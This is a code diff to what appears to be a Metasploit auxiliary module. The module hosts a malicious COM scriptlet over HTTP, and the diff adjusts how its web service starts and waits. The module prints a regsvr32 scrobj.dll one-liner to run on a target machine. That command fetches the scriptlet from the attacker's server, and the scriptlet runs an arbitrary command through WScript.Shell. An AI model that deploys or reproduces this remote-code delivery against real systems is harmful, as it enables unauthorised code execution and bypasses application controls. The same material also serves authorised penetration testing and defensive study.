@@ -38,9 +38,10 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def run
-    exploit
+    start_service
     print_status("Run the following command on the target machine:")
     print_line("regsvr32 /s /n /u /i:#{get_uri} scrobj.dll")
+    self.service.wait
   end
 
   def on_request_uri(cli, _request)
@@ -64,5 +65,4 @@ class MetasploitModule < Msf::Auxiliary
       return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
     end
   end
-
 end
